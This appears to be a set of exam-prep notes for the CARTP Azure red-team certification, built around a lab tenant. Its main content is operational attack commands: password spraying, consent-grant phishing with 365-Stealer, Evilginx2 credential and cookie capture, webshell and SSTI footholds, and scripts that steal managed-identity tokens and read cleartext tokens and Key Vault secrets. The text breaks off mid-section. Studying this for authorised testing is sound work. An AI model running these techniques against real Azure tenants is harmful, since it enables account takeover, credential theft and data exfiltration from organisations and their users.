---
title:       "CARTP Exam"
summary:     "Certified by Altered Security Red Team Professional for Azure (CARTP®)"
category:    "Altered Security"
tags:        [cartp, altered-security]
updated:     2026-05-21
---

{% raw %}

## CARTP-Notes

This repository contains professionally curated notes created during preparation for the CARTP (Certified Azure Red Team Professional) certification. These notes are designed to simplify complex Azure AD and cloud attack concepts while maintaining practical, real-world offensive tradecraft used during modern cloud security assessments.

The content focuses on Azure AD enumeration, privilege escalation, token abuse, persistence, lateral movement, hybrid identity attacks, and operational security techniques commonly encountered during red team engagements and cloud penetration tests.

These notes are intended to serve as a structured learning companion for students, operators, and security professionals preparing for cloud-focused red team operations. While highly practical and engagement-oriented, they should be used alongside hands-on labs, official course material, and real-world practice environments for maximum effectiveness.

## Content

- Recon
- Initial access attacks
- Authenticated enumeration
- Privilege Escalation
- Cloud <-> On-Prem - Lateral Movement
- Persistence

## **Recon**

## **Manually**

#### **Get if tenant is in use and if fedaration is in use.**

- Federation with Azure AD or O365 enables users to authenticate using on-premises credentials and access all resources in cloud.

```pascal
<https://login.microsoftonline.com/getuserrealm.srf?login=><USER>@<DOMAIN>&xml=1
<https://login.microsoftonline.com/getuserrealm.srf?login=root@defcorphq.onmicrosoft.com&xml=1>
```

#### **Get the Tenant ID**

```
<https://login.microsoftonline.com/><DOMAIN>/.well-known/openid-configuration
<https://login.microsoftonline.com/defcorphq.onmicrosoft.com/.well-known/openid-configuration>
```

## **AADinternals**

**Import the AADinternals module**

```
import-module .\\AADInternals.psd1
```

**Get tenant name, authentication, brand name (usually same as directory name) and domain name**

```
Get-AADIntLoginInformation -UserName <RANDOM USER>@<DOMAIN>
```

**Get tenant ID**

```
Get-AADIntTenantID -Domain <DOMAIN>
```

**Get tenant domains**

```
Get-AADIntTenantDomains -Domain <DOMAIN>
```

**Get all the information**

```
Invoke-AADIntReconAsOutsider -DomainName <DOMAIN>
```

## **Microburst**

#### **Enumerate used services**

- Edit the permutations.txt to add permutations such as career, hr, users, file and backup

```
Import-Module MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureSubDomains -Base <SHORT DOMAIN NAME> -Verbose
```

#### **Enumerate Azureblobs**

- add permutations to permutations.txt like common, backup, code in the misc directory.

```
Import-Module ./Microburst.psm1
Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt
```

#### **Valid emails**

**Check for Email ID's**

- [https://github.com/LMGsec/o365creeper](https://github.com/LMGsec/o365creeper)
- Could gather list of emails from something like harvester or [hunter.io](http://hunter.io/) or smth and validate them!
- admin, root, test, contact (try those default for exam)

```
python o365creeper.py -f list_of_emails.txt -o validemails.txt
```

## **Initial access attacks**

## **Password spraying**

```
Import-Module .\\MSOLSpray.ps1
Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
```

#### **Find valid emails**

- Explained in Recon or use the command below

```
C:\\Python27\\python.exe o365creeper.py -f emails.txt -o validemails.txt
```

## **Illicit Consent Grant phishing**

#### **Create a application**

- Login to the Azure portal and in the left menu go to 'Azure Active Directory' --> 'App registrations' and click 'new registration'
- Set a application name and choose 'Accounts in any organizational directory (Any Azure AD Directory - Multitenant'
- Use the URL of the student VM in the URI ([https://xx.xx.xx.xx/login/authorized](https://xx.xx.xx.xx/login/authorized))
- In the left menu go to 'Certificates & Secrets' and create a new client secret and copy it.
- In the left menu go to 'API permissions' and add the '[user.read](http://user.read/)' and 'User.ReadBasic.All' for the Microsoft Graph.

**Check if users are allowed to consent to apps**

```
Import-Module AzureADPreview.psd1

#Use another tenant account
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole

#output should be
ManagePermissionGrantsForSelf.microsoft-user-default-legacy
```

**Setup the 365-stealer**

- Copy the 365-stealer directory to the xampp directory
- Edit the [365-stealer.py](http://365-stealer.py/) and edit the CLIENTID (client application id), REDIRECTEDURL and CLIENTSECRET (From the certificate)

**Start the 365-stealer**

```
&"C:\\Program Files\\Python38\\python.exe" C:\\xampp\\htdocs\\365-Stealer\\365-Stealer.py --run-app
```

**Get the phishinglink**

- Browse to [https://localhost](https://localhost/) and click on readmore. Copy the link!

**Enumerating applications to send the phishing link**

- Edit the permutations.txt to add permutations such as career, hr, users, file and backup

```
. C:\\AzAD\\Tools\\MicroBurst\\Misc\\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base <BASE> –Verbose
```

**Get the access tokens**

- Browse to [http://localhost:82/365-Stealer/yourvictims/](http://localhost:82/365-Stealer/yourvictims/)
- Click on the user and copy the access token from access\_token.txt
- See the "Using Azure tokens" section

**Get admin consent**

- [https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent)
- Global Admin, Application Admin, or Cloud Application Administrator can all grant tenant wide application admin consent

```
- In the left menu go to 'API permissions' and add the mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send to Microsoft Graph.
- Refish the user to get a token with the extra permissions
```

**Start a listener**

```
nc.exe -lvp 4444
```

**Abuse the access token - Uploading word doc to OneDrive**

```
cd C:\\xampp\\htdocs\\365-Stealer\\

& 'C:\\Program Files\\Python38\\python.exe' 365-Stealer.py --upload <PATH TO DOC> --token-path C:\\xampp\\htdocs\\365-Stealer\\yourVictims\\<USER>\\access_token.txt
```

**Refresh all tokens**

- Access token is valid for 1 hour, can't be revoked.
- Refresh token is valid for 90 days but can be revoked.

```
python 365-Stealer.py --refresh-all
```

## **Insecure file upload**

- Upload a webshell to a insecure webapp
- If command execution is possible execute command `env`
- if the app service contains environment variables IDENITY\_HEADER and IDENTITY\_ENDPOINT, it has a managed identity.
- Get access token from managed identity using another webshell. Upload studentxtoken.phtml

## **Server Side Template Injection**

- SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side.
- That is, we can get command execution on a server by abusing this.
- Find we webapp which is vulnerable, test with injectin a expression `{{7*7}}` and see if it gets evaluated.
- The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework.
- Use `{{config.items()}}` and see if it works.
- Check if a managed identity is assigned (Check for the env variables IDENTITY\_HEADER and IDENTITY\_ENDPOINT)
- If code execution is possible execute the following to get a ARM access token for the managed identity:

```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

- Request keyvault Access token

```
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

- Request AADGraph token

```
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

## **OS Command injection**

- In case of OS command injection, it is possible to run arbitrary operating system commands on the server where requests are processed.
- This is usually due to insecure parsing of user input such as parameters, uploaded files and HTTP requests.

## **Storage account**

#### **Enumerate Azureblobs**

- add permutations to permutations.txt like common, backup, code in the misc directory.

```
Import-Module ./Microburst.psm1
Invoke-EnumerateAzureBlobs -Base defcorp
```

- Access the URL's and see if any files are listed (Example [https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list](https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list))
- Access the files by adding it to the url (Example [https://defcorpcommon.blob.core.windows.net/backup/blob\_client.py](https://defcorpcommon.blob.core.windows.net/backup/blob_client.py))
- Check for a SAS URL, if found then open the "Connect to Azure Storage", select "blobl container" and select 'Shared Access Signatur (SAS)' and paste the URL, displayname will fill automatically.

## **Phishing Evilginx2**

- [https://github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
- Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.

**Start evilgix2**

```
evilginx2 -p C:\\AzAD\\Tools\\evilginx2\\phishlets
```

**Configure the domain**

```
config domain studentx.corp
```

**Set the IP for the evilginx server**

```
config ip xx.xx.xx.xx
```

**Use the template for office365**

```
phishlets hostname o365 <DOMAIN>
```

**Verify the DNS entries**

```
phishlets get-hosts o365
```

**Copy the certificate and private key**

[0365.cr](http://0365.cr/) and 0365.key from `C:\\studentx\\.evilginx\\crt` to `C:\\studentx\\.evilginx\\crt\\login.studentx.corp`

**Enable phishlets**

```
phislets enable 0365
```

**Create the phishing URL (Tied to an ID)**

```
lures create 0365
```

**Get the phishing URL**

- Share the phishing URL with the victim

`lures get-url <ID>`

## **Authenticated enumeration**

## **General**

- The three main tools used to enumerate
  - AzureAD Module. Syntax used is `AzureAD*`
    - **Used to manage Azure AD.**
    - Only to interact with Azure AD, no access to Azure resources.
  - Azure Powershell. Syntax used is `Az*` and `AzAd*`
    - **Used to manage Azure resources.**
  - Azure CLI. Syntax used is `az *` (Az space)
    - **Create and manage Azure Resources.**

## **Enumeration through Azure portal**

#### **Login azure portal**

Login to the azure portal with successfull attacks [https://portal.azure.com/](https://portal.azure.com/)

**Enumerate users, groups, devices, directory roles, enterprise applications**

- Open the left menu --> Azure Active directory and click check the users, groups, Roles and administrators, Enterprise Application and devices tab.
- Also worth checking the "App services" and "Virtual machines"

## **Enumeration using AzureAD Module**

- [https://www.powershellgallery.com/packages/AzureAD](https://www.powershellgallery.com/packages/AzureAD)
- Rename .nukpkg to .zip and extract it

```
Import-Module AzureAD.psd1
```

**Connect to Azure AD**

```
$creds = Get-Credential
Connect-AzureAD -Credential $creds
```

```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
Connect-AzureAD -Credential $creds
```

**Get the current session state**

```
Get-AzureADCurrentSessionInfo
```

**Get the details of the current tenant**

```
Get-AzureADTenantDetail
```

### **User enumeration**

**Enumerate all users**

```
Get-AzureADUser -All $true
Get-AzureADUser -all $true | Select-Object UserPrincipalName, Usertype
```

**Enumerate a specific user**

```
Get-AzureADUser -ObjectId <ID>
```

**Search for a user based on string in first characters of displayname (Wildcard not supported)**

```
Get-AzureADUser -SearchString "admin"
```

**Search for user who contain the word "admin" in their displayname**

```
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"}
```

**List all the attributes for a user**

```
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | fl *

Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | %{$_.PSObject.Properties.Name}
```

**Search attributes for all users that contain the string "password"**

```
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
```

**All users who are synced from on-prem**

```
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
```

**All users who are from Azure AD**

```
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
```

**Get objects created by any user (use -objectid for a specific user)**

```
Get-AzureADUser | Get-AzureADUserCreatedObject
```

**Objects owned by a specific user**

```
Get-AzureADUserOwnedObject -ObjectId <ID>
```

### **Group enumeration**

**List all groups**

```
Get-AzureADGroup -All $true
```

**Enumerate a specific group**

```
Get-AzureADGroup -ObjectId <ID>
```

**Search for a group based on string in first characters of DisplayName (wildcard not supported)**

```
Get-AzureADGroup -SearchString "admin" | fl *
```

**To search for a group which contains the word "admin" in their name**

```
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"}
```

**Get groups that allow Dynamic membership (note the cmdlet name)**

```
Import-module AzureADPreview.psd1
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}  | fl *
```

**All groups that are synced from on-prem (note that security groups are not synced)**

```
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
```

**All groups that are from Azure AD**

```
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
```

**Get members of a group**

```
Get-AzureADGroupMember -ObjectId <ID>
```

**Get groups and roles where the specified user is a member**

```
Get-AzureADUser -SearchString 'test' | Get-AzureADUserMembership
Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
```

**Usefull group + member script**

```
$roleUsers = @()
$roles=Get-AzureADMSGroup

ForEach($role in $roles) {
  $users=Get-AzureADGroupMember -ObjectId $role.Id
  ForEach($user in $users) {
    write-host $role.DisplayName, $user.DisplayName, $user.UserPrincipalName, $user.UserType
    $obj = New-Object PSCustomObject
    $obj | Add-Member -type NoteProperty -name GroupName -value ""
    $obj | Add-Member -type NoteProperty -name UserDisplayName -value ""
    $obj | Add-Member -type NoteProperty -name UserEmailID -value ""
    $obj | Add-Member -type NoteProperty -name UserAccess -value ""
    $obj.GroupName=$role.DisplayName
    $obj.UserDisplayName=$user.DisplayName
    $obj.UserEmailID=$user.UserPrincipalName
    $obj.UserAccess=$user.UserType
    $roleUsers+=$obj
  }
}
$roleUsers
```

### **Role enumeration**

**Get all available role templates**

```
Get-AzureADDirectoryroleTemplate
```

**Get all roles**

```
Get-AzureADDirectoryRole
```

**Enumerate users to whom roles are assigned (Example of the Global Administrator role)**

```
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

**List custom roles**

```
Import-Module .\\AzureADPreview.psd1
$creds = Get-Credential
Connect-AzureAD -Credential $creds

Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

### **Devices enumeration**

**Get all Azure joined and registered devices**

```
Get-AzureADDevice -All $true | fl *
```

**Get the device configuration object (Note to the registrationquota in the output)**

```
Get-AzureADDeviceConfiguration | fl *
```

**List Registered owners of all the devices**

```
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
```

**List Registered user of all the devices**

```
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
```

**List devices owned by a user**

```
Get-AzureADUserOwnedDevice -ObjectId <ID>
```

**List deviced registered by a user**

```
Get-AzureADUserRegisteredDevice -ObjectId <ID>
```

**List deviced managed using Intune**

```
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
```

### **Administrative-unit enumeration**

**List the administrative units**

```
Get-AzureADMSAdministrativeUnit
```

**Get members of the administrative unit**

```
Get-AzureADMSAdministrativeUnitMember -id <ID>
```

**Get roles scoped in the administrative unit**

```
Get-AzureADMSScopedRoleMembership -id <ID> | fl *
```

**Check the role using the roleid**

```
Get-AzureADDirectoryRole -ObjectId <ID>
```

### **App enumeration**

**Get all application objects registered using the current tenant.**

```
Get-AzureADApplication -All $true
```

**Get all details about an application**

```
Get-AzureADApplication -ObjectId <ID> | fl *
```

**Get an application based on the display name**

```
Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"}
```

**Show application with a application password (Will not show passwords)**

```
Get-AzureADApplicationPasswordCredential
```

**Get the owner of a application**

```
Get-AzureADApplication -ObjectId <ID> | Get-AzureADApplicationOwner | fl *
```

**Get apps where a user has a role (exact role is not shown)**

```
Get-AzureADUser -ObjectId <ID> | Get-AzureADUserAppRoleAssignment | fl *
```

**Get apps where a group has a role (exact role is not shown)**

```
Get-AzureADGroup -ObjectId <ID> | Get-AzureADGroupAppRoleAssignment | fl *
```

### **Service-principals enumeration**

Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'! Service Principals can be assigned Azure roles.

**Get all service principals**

```
Get-AzureADServicePrincipal -All $true
```

**Get all details about a service principal**

```
Get-AzureADServicePrincipal -ObjectId <ID> | fl *
```

**Get a service principal based on the display name**

```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}
```

**Get owners of a service principal**

```
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalOwner | fl *
```

**Get objects owned by a service principal**

```
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalOwnedObject
```

**Get objects created by a service principal**

```
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalCreatedObject
```

**Get group and role memberships of a service principal**

```
Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalMembership | fl *

Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
```

## **Enumeration using Az powershell**

**Install module**

```
Install-Module Az
```

**List all az commands**

```
Get-Command -Module Az.*
```

**List cmdlets for Az AD powershell (*****Azad format*****)**

```
Get-Command *aZad*
```

**List all cmdlets for Azure resources (*****Az format*****)**

```
Get-Command *aZ*
```

**List all cmdlets for a particular resource**

```
Get-Command *azvm*
Get-Command -Noun *vm* -Verb Get
Get-Command *vm*
```

**Login with the az module**

```
Connect-AzAccount
```

**Get the information about the current context (Account, Tenant, Subscription etc).**

```
Get-AzContext
```

**List available contexts**

```
Get-AzContext -ListAvailable
```

**Change AZ context**

```
Set-AzContext <ID>
```

### **Available resources**

**Enumerate subscriptions accessible by the current user**

```
Get-AzSubscription
```

**Enumerate all resources visible to the current user**

- Error 'this.Client.SubscriptionId' cannot be null' means the managed identity has no rights on any of the Azure resources.

```
Get-AzResource
Get-AzResource | select-object Name, Resourcetype
```

### **Roles**

**Enumerate all Azure RBAC role assignments**

```
Get-AzRoleAssignment
```

**Check role assignments on ResourceID**

```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

**Get the allowed actions on the role definition**

```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

### **Users**

**Enumerate all users**

```
Get-AzADUser
```

**Enumerate a specific user**

```
Get-AzADUser -UserPrincipalName <NAME>
```

**Search for a user based on string in first character of displayname (Wildcard not supported)**

```
Get-AzADUser -SearchString "admin"
```

**Search for a user who contain the word "admin" in their displayname:**

```
Get-AzADUser |?{$_.Displayname -match "admin"}
```

### **Groups**

**List all groups**

```
Get-AzADGroup
```

**Enumerate a specific group**

```
Get-AzADGroup -ObjectId <ID>
```

**Search for a group based on string in first characters of displayname (wildcard not supported)**

```
Get-AzADGroup -SearchString "admin" | fl *
```

**To search for groups which contain the word "admin" in their name:**

```
Get-AzADGroup |?{$_.Displayname -match "admin"}
```

**Get members of a group**

```
Get-AzADGroupMember -ObjectId <ID>
```

### **Resources**

**Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app.**

```
Get-AzADApplication
```

**Get all details about an application**

```
Get-AzADApplication -ObjectId <ID>
```

**Get an application based on the display name**

```
Get-AzADApplication | ?{$_.DisplayName -match "app"}
```

**Get all service principals**

```
Get-AzADServicePrincipal
```

**Get all details about a service principal**

```
Get-AzADServicePrincipal -ObjectId <ID>
```

**Get an service principal based on the display name**

```
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
```

**List all VM's the user has access to**

```
Get-AzVM
Get-AzVM | fl
```

**Get all function apps**

```
Get-AzFunctionApp
```

**Get all webapps**

```
Get-AzWebApp
Get-AzWebApp | select-object Name, Type, Hostnames
```

**List all storage accounts**

```
Get-AzStorageAccount
Get-AzStorageAccount | fl
```

**List all keyvaults**

```
Get-AzKeyVault
```

**Get info about a specific keyvault**

```
Get-AzKeyVault -VaultName ResearchKeyVault
```

**List the saved creds from keyvault**

```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -AsPlainText
```

**Read creds from a keyvault**

```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

## **Enumeration using Azure CLI**

- Install [https://docs.microsoft.com/en-us/cli/azure/install-azure-cli](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)
- Accessible in the cloud shell to

**Login**

```
az login

az login -u <USERNAME> -p <PASSWORD>
```

**List info on the current user**

```
az ad signed-in-user show
```

**Configure default behavior (Output type, location, resource group etc)**

```
az configure
```

**Find popular commands**

```
az find "vm"

az find "az vm"

az find "az vm list"
```

**List all users**

Use the --output parameter to change the output layout, default is json

```
az ad user list --output table
```

**List only the userPrincipalName and givenName**

Second command renames properties

```
az ad user list --query "[].[userPrincipalName,displayName]" --output table

az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table
```

**We can use JMESPath query on the results of JSON output. Add --query-examples at the end of any command to see examples**

```
az ad user show list --query-examples
```

**Get details of the current tenant**

```
az account tenant list
```

**Get details of the current subscription**

```
az account subscription list
```

**List the current signed-in user**

```
az ad signed-in-user show
```

**List all owned objects by user**

```
az ad signed-in-user list-owned-objects
```

**Enumerate all users**

```
az ad user list
az ad user list --query "[].[displayName]" -o table
```

**Enumerate a specific user**

```
az ad user show --id test@defcorphq.onmicrosoft.com
```

**Search for users who contain the word "admin" in their Display name (case sensitive):**

```
az ad user list --query "[?contains(displayName,'admin')].displayName"
```

**When using PowerShell, search for users who contain the word "admin" in their Display name. This is NOT case-sensitive:**

```
az ad user list | ConvertFrom-Json | %{$_.displayName -match "admin"}
```

**List all users who are synced from on-prem**

```
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
```

**All users who are from Azure AD**

```
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
```

**List all groups**

```
az ad group list
az ad group list --query "[].[displayName]" -o table
```

**Enumerate a specific group using display name or object id**

```
az ad group show -g "VM Admins"
az ad group show -g <ID>
```

**Search for groups that contain the word "admin" in their Display name (case sensitive) - run from cmd:**

```
az ad group list --query "[?contains(displayName,'admin')].displayName"
```

**When using PowerShell, search for groups that contain the word "admin" in their Display name. This is NOT case-sensitive:**

```
az ad group list | ConvertFrom-Json | %{$_.displayName -match "admin"}
```

**All groups that are synced from on-prem**

```
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
```

**All groups that are from Azure AD**

```
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
```

**Get members of a group**

```
az ad group member list -g "VM Admins" --query "[].[displayName]" -o table
```

**Check if user is member of the specified group**

```
az ad group member check --group "VM Admins" --member-id <ID>
```

**Get the object IDs of the groups of which the specified group is a member**

```
az ad group get-member-groups -g "VM Admins"
```

**Get all the application objects registered with the current tenant**

```
az ad app list
az ad app list --query "[].[displayName]" -o table
```

**Get all details about an application using identifier uri, application id or object id**

```
az ad app show --id <ID>
```

**Get an application based on the display name (Run from cmd)**

```
az ad app list --query "[?contains(displayName,'app')].displayName"
```

**When using PowerShell, search for apps that contain the word "slack" in their Display name. This is NOT case-sensitive:**

```
az ad app list | ConvertFrom-Json | %{$_.displayName -match "app"}
```

**Get owner of an application**

```
az ad app owner list --id <ID> --query "[].[displayName]" -o table
```

**List apps that have password credentials**

```
az ad app list --query "[?passwordCredentials != null].displayName"
```

**List apps that have key credentials**

```
az ad app list --query "[?keyCredentials != null].displayName"
```

**Get all service principal names**

```
az ad sp list --all
az ad sp list -all --query "[].[displayName]" -o table
```

**Get all details about a service principal**

```
az ad sp show --id <ID>
```

**Get a service principal based on the display name**

```
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
```

**When using PowerShell, search for service principals that contain the word "slack" in their Display name. This is NOT case-sensitive:**

```
az ad sp list --all | ConvertFrom-Json | %{$_.displayName -match "app"}
```

**Get owner of a service principal**

```
az ad sp owner list --id <ID> --query "[].[displayName]" -o table
```

**Get service principal owned by the current user**

```
az ad sp list --show-mine
```

**List apps that have password credentials**

```
az ad sp list --all --query "[?passwordCredentials != null].displayName"
```

**List apps that have key credentials**

```
az ad sp list -all --query "[?keyCredentials != null].displayName"
```

**List all the vm's**

```
az vm list
az vm list --query "[].[name]" -o table
```

**List all app services**

```
az webapp list
az webapp list --query "[].[name]" -o table
```

**List function apps**

`az functionapp list az functionapp list --query "[].[name]" -o table`

**list the readable keyvaults**

```
az keyvault list
```

**List storage accounts**

```
az storage account list
```

## **Using Azure tokens**

- Both Az PowerShell and AzureAD modules allow the use of Access tokens for authentication.
- Usually, tokens contain all the claims (including that for MFA and Conditional Access etc.) so they are useful in bypassing such security controls.
- Office 365 stealer steals a token for the Graph API with the permissions that are registered.
- For managed identities check the IDENTITY\_ENDPOINT to see which token it is.
- Can also use [https://jwt.io](https://jwt.io/) or [https://jwt.ms](https://jwt.ms/) to see what token it is.
- Which token to use
  - Access Token - Azure Resouces
  - Graph Token - Azure AD
  - Key Vault Token - Keyvault Access

### **Stealing tokens**

#### **Stealing tokens from az cli**

- az cli stores access tokens in clear text in `accessTokens.json` in the directory `C:\\Users\\<username>\\.Azure`
- We can read tokens from the file, use them and request new ones too!
- `azureProfile.json` in the same directory contains information about subscriptions.
- You can modify `accessTokens.json` to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
- To clear the access tokens, always use az logout

#### **Stealing tokens from az powershell**

- Az PowerShell stores access tokens in clear text in `TokenCache.dat` in the directory `C:\\Users\\<username>\\.Azure`
- It also stores ServicePrincipalSecret in clear-text in `AzureRmContext.json` if a service principal secret is used to authenticate.
- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
- Users can save tokens using Save-AzContext, look out for them! Search for `Save-AzContext` in PowerShell console history!
- Always use Disconnect-AzAccount!!

**Request tokens from the CLI!**

- Check below for example in using tokens!

**Stealing token scripts**

**Python**

```
import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()

print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\\r\\n[+] Graph API")
print(json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])
```

**PHP**

```
<?php

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

### **Using tokes with CLI Tools - AZ PowerShell**

**Request access token**

```
Get-AzAccessToken
(Get-AzAccessToken).Token
```

**Request an access token for AAD Graph to access Azure AD.**

- Supported tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse

```
Get-AzAccessToken -ResourceTypeName AadGraph
```

**Request token for microsoft graph**

```
(Get-AzAccessToken -Resource "<https://graph.microsoft.com>").Token
```

**Use the access token**

```
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA...
```

**Use other access token**

- In the below command, use the one for AAD Graph (access token is still required) for accessing Azure AD
- To access something like keyvault you need to get the access token for it before you can access it.

```
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... -GraphAccessToken eyJ0eXA...
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA...
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... -Tenantid <Tenant ID>
```

### **Using tokes with CLI Tools - Azure CLI**

Azure CLI can request a token but cannot use it!

**Request an access token (ARM)**

```
az account get-access-token
```

**Request an access token**

Supported tokens - aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms

```
az account get-access-token --resource-type ms-graph
```

### **Using tokes with AzureAD module**

- AzureAD module cannot request a token but can use one for AADGraph or Microsoft Graph!
- To be able to interact with Azure AD, request a token for the aad-graph.

**Connecting with AzureAD**

```
Connect-AzureAD -AccountId <ID> -AadAccessToken $token -TenantId <TENANT ID>
```

### **Using tokens with API's - management**

- The two REST APIs endpoints that are most widely used are – Azure Resource Manager - [management.azure.com](http://management.azure.com/) – Microsoft Graph - [graph.microsoft.com](http://graph.microsoft.com/) (Azure AD Graph which is deprecated is [graph.windows.net](http://graph.windows.net/))
- Let's have a look at super simple PowerShell codes for using the APIs

**Get an access token and use it with ARM API. For example, list all the subscriptions**

```
$Token = 'eyJ0eXAi..'
$URI = '<https://management.azure.com/subscriptions?api-version=2020-01-01>'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

**Get an access token for MS Graph. For example, list all the users**

```
$Token = 'eyJ0eX..'
$URI = '<https://graph.microsoft.com/v1.0/users>'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

### **Abusing tokens**

**Check the resources available to the managed identity**

Throws an error and nikil is unsure why

```
$token = 'eyJ0eX...'

Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
```

**Use the Azure REST API to get the subscription id**

```
$Token = 'eyJ0eX..'
$URI = '<https://management.azure.com/subscriptions?api-version=2020-01-01>'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

**List all the resources available by the managed identity to the app service**

```
$URI = '<https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01>'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

**Check what actions are allowed to the vm**

- The runcommand privileges lets us execute commands on the VM

```
